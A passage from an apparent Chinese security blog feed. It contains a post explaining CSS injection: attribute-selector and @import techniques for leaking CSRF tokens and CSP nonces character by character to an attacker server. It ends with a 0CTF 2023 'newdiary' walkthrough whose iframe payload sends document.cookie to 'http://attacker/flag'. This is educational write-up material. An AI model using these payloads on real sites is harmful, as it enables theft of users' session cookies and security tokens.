pyjail 系列博客😊。 参考 第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh 强网杯 2023 线上赛部分 Writeup - Hurrison’s Blog 13. Structural Pattern Matching (Python 3.10+) — Level Up Your Python]]></summary></entry><entry><title type="html">前端安全：CSS 注入</title><link href="/css/2023/12/12/CSS-injection.html" rel="alternate" type="text/html" title="前端安全：CSS 注入" /><published>2023-12-12T18:29:48+08:00</published><updated>2023-12-12T18:29:48+08:00</updated><id>/css/2023/12/12/CSS-injection</id><content type="html" xml:base="/css/2023/12/12/CSS-injection.html"><![CDATA[<h1 id="前端安全css-注入">前端安全：CSS 注入</h1>
<p>css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。</p>
<h2 id="css-注入原理">CSS 注入原理</h2>
<p>下面的 payload 展示了一个窃取 csrf-token 的示例。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE html&gt;

&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;style&gt;
        form:has<span class="o">(</span>input[name<span class="o">=</span><span class="s2">"csrf-token"</span><span class="o">][</span>value^<span class="o">=</span><span class="s2">"a"</span><span class="o">]){</span>
            background: url<span class="o">(</span><span class="s2">"http://attacker/?q=a"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
    &lt;/style&gt;
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
&lt;/head&gt;

&lt;body&gt;
    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/action"</span><span class="o">&gt;</span>
        &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"csrf-token"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"abc123"</span><span class="o">&gt;</span>
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>
<p>在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name=”csrf-token”，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。</p>

<p>换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>得到第一个字符后（假设为 a），就可以开始遍历第二个字符。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。</p>

<p>但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。</p>

<p>如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。</p>

<p>Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。</p>

<p>@import 可以进一步加载其他的 css。示例 payload 如下：</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/start?len=8)</span>
</code></pre></div></div>
<p>攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span>
</code></pre></div></div>
<p>客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>后面的过程依次类推。</p>

<p>这种方式也有一些需要注意的地方：</p>
<ol>
  <li>浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。</li>
  <li>firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：<a href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point - research.securitum.com</a></li>
</ol>

<p>chrome 和 firefox 通用 payload：</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nt">style</span><span class="o">&gt;</span><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
</code></pre></div></div>

<h2 id="更快的枚举">更快的枚举</h2>
<p>文章 <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk - Sonar</a> 展示了一种更快的枚举方式。</p>

<p>通过示例代码可以更好地理解：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Security-Policy"</span>
      <span class="nv">content</span><span class="o">=</span><span class="s2">"script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"</span><span class="o">&gt;</span>
  &lt;/head&gt;
  &lt;style&gt;
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aab"</span><span class="o">]){</span><span class="nt">--tosend-aab</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aab<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aac"</span><span class="o">]){</span><span class="nt">--tosend-aac</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aac<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>

  &lt;/style&gt;
  &lt;body&gt;
    &lt;input&gt;
    &lt;script <span class="nv">nonce</span><span class="o">=</span><span class="s2">"nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"</span><span class="o">&gt;</span>
        console.log<span class="o">(</span>1<span class="o">)</span>
    &lt;/script&gt;
  &lt;/body&gt;
</code></pre></div></div>
<p>页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。</p>

<p>其中 css 注入 payload 如下。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>
</code></pre></div></div>
<p>其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（<code class="language-plaintext highlighter-rouge">*=</code> 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 – 开头），通过这个属性向外发起请求。</p>

<p>定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。</p>

<p>由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212195241.png" alt="20231212195241" /></p>

<p>如何获取完整的字符串呢？假设 none 值为 32 位随机字符串：
qhkkzvf5mc3iv090nyysyq6wc80ai4v1</p>

<p>我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="sh">'</span><span class="s">f5m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c3i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">i4v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3iv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">zvf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">iv0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">syq</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ai</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6wc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kkz</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yq6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">q6w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5mc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c80</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4v1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ysy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ny</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yys</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ai4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">090</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">v09</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">nyy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">mc3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hkk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">qhk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vf5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kzv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wc8</span><span class="sh">'</span><span class="p">}</span>
</code></pre></div></div>
<p>这样一来，只需要较少的请求就可以获取完整的字符串。</p>

<h2 id="0ctf-2023-newdiary">0CTF 2023 newdiary</h2>
<p>前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212200326.png" alt="20231212200326" /></p>

<p>题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。</p>

<p>题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
      <span class="na">content=</span><span class="s">"script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>但 CSP style-src 设置为 ‘unsafe-inline’ https://unpkg.com”，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。</p>

<p>利用步骤如下：</p>
<ol>
  <li>新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0.0;url=http://192.168.137.98:8888/index.html"</span><span class="nt">&gt;</span> 
</code></pre></div>    </div>
    <p>其中 index.html 内容如下：</p>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;head&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;title&gt;</span>Document<span class="nt">&lt;/title&gt;</span>
 <span class="nt">&lt;/head&gt;</span>
 <span class="nt">&lt;body&gt;</span>
        
     <span class="nt">&lt;script&gt;</span>
         <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">milliseconds</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">milliseconds</span><span class="p">));</span>
         <span class="k">async</span> <span class="kd">function</span> <span class="nf">run</span><span class="p">(){</span>
             <span class="nx">bot_window</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost/share/read#id=1&amp;username=</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// Exploit 1, leak nonce</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">7000</span><span class="p">);</span>

             <span class="nx">bot_window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/share/read#id=2&amp;username=</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Exploit 2, leak cookie</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
             <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">O</span><span class="dl">"</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="nf">run</span><span class="p">();</span>
     <span class="nt">&lt;/script&gt;</span>
 <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
</code></pre></div>    </div>
    <p>其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。</p>
  </li>
  <li>新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"http://unpkg.com/xxx/leak.css"</span><span class="nt">&gt;&lt;input</span> <span class="nt">/&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。</li>
  <li>枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;iframe <span class="nv">name</span><span class="o">=</span>asd <span class="nv">srcdoc</span><span class="o">=</span><span class="s2">"&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"</span>/&gt;
</code></pre></div>    </div>
    <p>因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。</p>
  </li>
  <li>bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。</li>
</ol>

<p>这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。</p>

<p>题目 payload 可参考：<a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></p>

<p>使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212203249.png" alt="20231212203249" /></p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></li>
  <li><a href="https://aszx87410.github.io/beyond-xss/">Beyond XSS</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CSS" /><category term="CSS" /><category term="0ctf 2023" /><summary type="html"><![CDATA[前端安全：CSS 注入 css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。 CSS 注入原理 下面的 payload 展示了一个窃取 csrf-token 的示例。 &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;style&gt; form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } &lt;/style&gt; &lt;meta charset="UTF-8"&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="/action"&gt; &lt;input name="username"&gt; &lt;input type="submit"&gt; &lt;input type="hidden" name="csrf-token" value="abc123"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name=”csrf-token”，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。 换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。 form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... 得到第一个字符后（假设为 a），就可以开始遍历第二个字符。 form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... 利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。 但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。 如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。 Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。 @import 可以进一步加载其他的 css。示例 payload 如下： @import url(https://myserver.com/start?len=8) 攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) 客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。 form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... 第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。 form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... 后面的过程依次类推。 这种方式也有一些需要注意的地方： 